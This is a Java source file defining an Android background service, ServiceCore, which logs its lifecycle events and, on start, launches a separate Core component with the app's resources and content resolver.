package com.android.service.app;

import com.android.service.Core;
import com.android.service.Status;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;


/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	private static final String TAG = "ServiceCore";
	
	private Core core;
	
	/* (non-Javadoc)
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		super.onCreate();
		Log.d("QZ", TAG + " (onCreate)");

		//Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
		Status.setAppContext(getApplicationContext());
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();
		Log.d("QZ", TAG + " (onDestroy)");

		//Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
		core.Stop();
		core = null;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onStart(android.content.Intent, int)
	 */
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		Log.d("QZ", TAG + " (onStart)");
		
		Toast.makeText(this, "Service Started, starting thread", Toast.LENGTH_LONG).show();
		
			
		core = new Core();

		// Core starts
		core.Start(this.getResources(), getContentResolver());
	}
}

